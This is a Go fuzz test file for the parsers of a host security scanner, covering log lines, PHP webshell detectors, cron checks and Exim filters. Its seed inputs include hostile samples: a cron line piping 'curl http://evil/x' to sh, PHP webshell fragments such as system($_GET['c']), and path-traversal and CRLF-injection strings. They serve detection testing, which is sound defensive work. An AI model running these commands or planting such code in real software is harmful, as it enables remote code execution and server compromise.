package checks

import (
	"strings"
	"testing"
)

// These are fuzz targets for the string parsers that accept external input
// (log lines, finding messages, wp-config bodies, /proc/net/tcp rows).
// Each target just asserts that the function returns without panicking on
// any input -- the goal is crash-finding, not output verification.
//
// Run the seed corpus with `go test -run=Fuzz`. Run actual fuzzing with
// `go test -fuzz=FuzzFoo -fuzztime=30s ./internal/checks/` during
// investigation.

func FuzzExtractIPAfterKeyword(f *testing.F) {
	// Seeds cover the shapes the function sees in real logs.
	f.Add("Accepted publickey for root from 203.0.113.5 port 22", "from")
	f.Add("rip=198.51.100.99, lip=10.0.0.1", "rip=")
	f.Add("", "")
	f.Add("keyword at the end keyword=", "keyword=")
	f.Add("ipv6 from 2001:db8::1 port 22", "from")
	f.Fuzz(func(t *testing.T, line, keyword string) {
		_ = extractIPAfterKeyword(line, keyword)
	})
}

func FuzzExtractBracketedIP(f *testing.F) {
	f.Add("H=client [203.0.113.50]:2222 auth failed")
	f.Add("no bracket here")
	f.Add("[1.2.3.4]")
	f.Add("[")
	f.Add("[unclosed bracket")
	f.Add("[][][][]")
	f.Fuzz(func(t *testing.T, line string) {
		_ = extractBracketedIP(line)
	})
}

func FuzzFirstField(f *testing.F) {
	f.Add("203.0.113.5 - - [14/Apr/2026:10:00:00 +0000] \"GET /\"")
	f.Add("2001:db8::1 rest of line")
	f.Add("not-an-ip first field here")
	f.Add("")
	f.Add("   ")
	f.Fuzz(func(t *testing.T, line string) {
		_ = firstField(line)
	})
}

func FuzzExtractPID(f *testing.F) {
	f.Add("PID: 12345, exe=/bin/ls")
	f.Add("info before PID: 999 trailing")
	f.Add("PID: 42")
	f.Add("PID: 7\nlater")
	f.Add("no pid here")
	f.Add("PID: ")
	f.Fuzz(func(t *testing.T, details string) {
		_ = extractPID(details)
	})
}

func FuzzExtractFilePath(f *testing.F) {
	f.Add("webshell at /home/u/public_html/x.php was found")
	f.Add("file in /dev/shm/y.so")
	f.Add("comma terminator: /home/a/b.php, more")
	f.Add("no path mentioned")
	f.Add("")
	f.Add("/home/")
	f.Add("/var/tmp/")
	f.Fuzz(func(t *testing.T, message string) {
		_ = extractFilePath(message)
	})
}

func FuzzExtractEximMsgID(f *testing.F) {
	f.Add("phishing detected (message: 2jKPFm-000abc-1X) blah")
	f.Add("no marker")
	f.Add("(message: open-but-no-close")
	f.Add("(message: )")
	f.Add("(message: ../../etc/passwd)")
	f.Fuzz(func(t *testing.T, message string) {
		_ = extractEximMsgID(message)
	})
}

func FuzzExtractPHPDefine(f *testing.F) {
	f.Add("define( 'DB_NAME', 'mydb' );")
	f.Add("define(\"DB_USER\", \"root\");")
	f.Add("define('DISABLE_WP_CRON', true);")
	f.Add("define('WP_MEMORY_LIMIT', 256);")
	f.Add("// commented out")
	f.Add("")
	f.Add("define(")
	f.Add("define(,,,,)")
	f.Fuzz(func(t *testing.T, line string) {
		_ = extractPHPDefine(line)
	})
}

func FuzzHasPregReplaceEvalWithRequest(f *testing.F) {
	f.Add("preg_replace('/.*/e', $_POST['c'], $s);")
	f.Add("preg_replace('~x~ie', $r, $s);")
	f.Add("preg_replace('/[a-z]+/i', 'x', $s);")
	f.Add("$doc = \"preg_replace('/a/e', ...)\";")
	f.Add(`preg_replace('!s:(\d+):"(.*?)";!e', "'s:'.strlen('$2')", $serial);`)
	f.Add("preg_replace('/x/e', $r, $_GET['s']);")
	f.Add("$x = $_POST['c']; preg_replace('/x/e', $x, $s);")
	f.Add(`preg_replace("/$_GET[p]/e", "'ok'", $subject);`)
	f.Add("function f() { $x = $_POST['c']; } preg_replace('/x/e', $x, $s);")
	f.Add("preg_replace(")
	f.Add("preg_replace('")
	f.Add("preg_replace('/')")
	f.Add("preg_replace('(unterminated")
	f.Add("preg_replace ( '{x}e' ,")
	f.Add("")
	f.Add("preg_replace")
	f.Fuzz(func(t *testing.T, s string) {
		_ = hasPregReplaceEvalWithRequest(s)
	})
}

func FuzzHasCallUserFuncHexNameBuild(f *testing.F) {
	f.Add("call_user_func(\"\\x73\".\"\\x79\".\"\\x73\", $a);")
	f.Add("$n = \"\\x63\".\"\\x75\".\"\\x72\"; call_user_func($n, $x);")
	f.Add("$n = \"\\x63\"; $n .= \"\\x75\"; $n .= \"\\x72\"; call_user_func($n, $x);")
	f.Add("call_user_func_array($cb, $args);")
	f.Add("call_user_func(")
	f.Add("$n = ; call_user_func($n);")
	f.Add("call_user_func($")
	f.Add("$ .= ")
	f.Add("")
	f.Fuzz(func(t *testing.T, s string) {
		_ = hasCallUserFuncHexNameBuild(s)
	})
}

func FuzzStripPHPHeredoc(f *testing.F) {
	// Heredoc/nowdoc openers and bodies the strip functions must walk without
	// panicking or running off the end of the buffer.
	f.Add("$a = <<<EOT\nbody line\nEOT;\n$b = 1;\n")
	f.Add("$a = <<<'EOT'\nsystem($_GET[c]);\nEOT;\n")
	f.Add("$a = <<<\"EOT\"\n  indented\n  EOT;\n")
	f.Add("<<<EOT") // opener, no body, no close
	f.Add("<<<")    // bare marker
	f.Add("<<<EOT\nunterminated body with 'quote and \"quote")
	f.Add("$x = <<<EOT\nEOT") // close at EOF, no newline after label
	f.Add("a << b < c <<< d") // not a heredoc
	f.Add("<<<123\nx\n123\n") // label not an identifier
	f.Fuzz(func(t *testing.T, code string) {
		// Neither pass may panic, and the comment pass must preserve length-ish
		// invariants only loosely; we only assert no crash here.
		_ = stripPHPCommentsFromCode(code)
		_ = stripPHPStringsFromCode(code)
		// The opener/end helpers must also be panic-free on arbitrary offsets.
		for i := 0; i < len(code); i++ {
			if label, bodyStart, ok := phpHeredocOpen(code, i); ok {
				_ = phpHeredocEnd(code, bodyStart, label)
			}
		}
	})
}

func FuzzPHPCodeOnly(f *testing.F) {
	// Mixed PHP/HTML shapes the inline-HTML blanker must walk without panicking.
	f.Add("<?php echo 1; ?>\n<p>html</p>\n<?php system($_GET['c']); ?>")
	f.Add("<p>don't desync me</p><?php $x = `id`; ?>")
	f.Add("<?= $_SERVER['HTTP_HOST'] ?>")
	f.Add("<?php $s = \"a ?> b\"; echo $s; ?>")         // ?> inside a string
	f.Add("<?php /* ?> */ echo 1; ?>")                  // ?> inside a block comment
	f.Add("<?php // trailing ?> html <?php echo 2; ?>") // ?> ends a line comment
	f.Add("<?php $h = <<<EOT\n?> not a tag\nEOT;\n?>")  // ?> inside a heredoc
	f.Add("plain html with no php tags at all")
	f.Add("<?")
	f.Add("<?php")
	f.Add("")
	f.Fuzz(func(t *testing.T, code string) {
		out := phpCodeOnly(code)
		// The blanker substitutes byte-for-byte (HTML->space, <?php->spaces,
		// ?>-> "; "), so output length must equal input length. A drift means
		// an off-by-one that could swallow or duplicate code bytes.
		if len(out) != len(code) {
			t.Fatalf("length changed: in=%d out=%d", len(code), len(out))
		}
	})
}

func FuzzExtractPHPString(f *testing.F) {
	f.Add(" 'hello');")
	f.Add(` "world");`)
	f.Add(`'first' "second"`)
	f.Add(`'unclosed "fallback";`)
	f.Add("no quotes here")
	f.Add("")
	f.Fuzz(func(t *testing.T, s string) {
		_ = extractPHPString(s)
	})
}

func FuzzParseHexAddr(f *testing.F) {
	// /proc/net/tcp column 1 / 2 format: hex_ip:hex_port
	f.Add("01010101:0035")
	f.Add("0100007F:ABCD")
	f.Add("00000000:0000")
	f.Add("")
	f.Add(":")
	f.Add("zzzz:zzzz")
	f.Add("0123456789ABCDEF01234567:0050") // IPv6-ish
	f.Fuzz(func(t *testing.T, s string) {
		_, _ = parseHexAddr(s)
	})
}

func FuzzDecodeHexString(f *testing.F) {
	f.Add("")
	f.Add("6c73") // "ls"
	f.Add("odd-length-not-hex")
	f.Add("g0ff") // non-hex char
	f.Add("0000") // all zeros
	f.Fuzz(func(t *testing.T, s string) {
		_ = decodeHexString(s)
	})
}

func FuzzCronHasDangerTokens(f *testing.F) {
	f.Add("0 16 * * * root /usr/sbin/cl-smart-advice update-advices-metadata")
	f.Add("* * * * * root curl http://evil/x | sh")
	f.Add("* * * * * root /tmp/x.sh")
	f.Add("")
	f.Add("\x00\x00\x00")
	f.Add("@daily root /usr/sbin/cloudlinux-xray-continuous &> /dev/null")
	f.Fuzz(func(t *testing.T, line string) {
		_ = cronHasDangerTokens([]byte(line))
	})
}

func FuzzParseDBFindingDetails(f *testing.F) {
	f.Add("Database: alice_wp\nOption: siteurl")
	f.Add("no match at all")
	f.Add("Database: only-db")
	f.Add("Option: only-option")
	f.Add("")
	f.Fuzz(func(t *testing.T, details string) {
		_, _ = parseDBFindingDetails(details)
	})
}

func FuzzParseAccessLogRecord(f *testing.F) {
	// Baseline Combined Log Format line (RFC 5737 IPs).
	f.Add(`192.0.2.1 - - [14/Apr/2026:10:00:00 +0000] "POST /wp-login.php HTTP/1.1" 401 123 "-" "curl/8"`)
	// cPanel variant with quoted vhost extension.
	f.Add(`198.51.100.5 - - [14/Apr/2026:10:00:01 +0000] "GET / HTTP/1.1" 200 500 "https://example.com/" "Mozilla/5.0" "example.com:2083"`)
	// Quoted XFF extension after UA.
	f.Add(`203.0.113.7 - - [14/Apr/2026:10:00:02 +0000] "GET /index.html HTTP/1.1" 200 100 "-" "Go-http-client/1.1" "192.0.2.99, 10.0.0.1"`)
	// 1 MiB User-Agent -- parser must cap and not panic.
	f.Add("192.0.2.2 - - [14/Apr/2026:10:00:03 +0000] \"GET / HTTP/1.1\" 200 0 \"-\" \"" + strings.Repeat("A", 1<<20) + "\"")
	// Embedded NUL in quoted field.
	f.Add("192.0.2.3 - - [14/Apr/2026:10:00:04 +0000] \"GET /\x00path HTTP/1.1\" 200 0 \"-\" \"-\"")
	// CRLF in UA field.
	f.Add("192.0.2.4 - - [14/Apr/2026:10:00:05 +0000] \"GET / HTTP/1.1\" 200 0 \"-\" \"UA\r\ninjected\"")
	// Truncated below minimum field count.
	f.Add("192.0.2.5 - -")
	f.Add("")
	f.Add("short")
	// Unclosed bracket in time.
	f.Add("192.0.2.6 - - [14/Apr/2026:10:00:06 +0000 \"GET / HTTP/1.1\" 200 0 \"-\" \"-\"")
	// Unclosed quote in request.
	f.Add("192.0.2.7 - - [14/Apr/2026:10:00:07 +0000] \"GET / HTTP/1.1 200 0 \"-\" \"-\"")
	f.Fuzz(func(t *testing.T, line string) {
		// Only assert no panic; output correctness is verified by table tests.
		_, _ = parseAccessLogRecord(line)
	})
}

func FuzzParseEximFilter(f *testing.F) {
	// Exim filter bodies are attacker-controlled (written via the cPanel API
	// once a webmail account is compromised). The tokenizer/parser must walk
	// any input without panicking or running off the buffer.
	f.Add("if\n $header_from: contains \"@\"\nthen\n deliver \"x@y.com\"\nendif\n")
	f.Add("if not first_delivery and error_message then finish endif")
	f.Add("deliver \"\\\"$local_part+INBOX\\\"@$domain\"")
	f.Add("save \"/dev/null\" 660")
	f.Add("unseen deliver")          // verb with no arg
	f.Add("if then endif")           // empty condition and branch
	f.Add("\"unterminated string")   // unclosed quote
	f.Add("(((")                     // dangling parens
	f.Add("if if if then then then") // pathological nesting
	f.Add("elif else endif endif")   // stack underflow attempts
	f.Add("")                        // empty
	f.Add("# comment only\n")        // comment, no tokens
	f.Fuzz(func(t *testing.T, content string) {
		rules := parseEximFilter(content)
		mb := filterMailbox{localPart: "u", domain: "example.com"}
		_ = scoreFilterRules(rules, mb, map[string]bool{"example.com": true}, nil)
	})
}
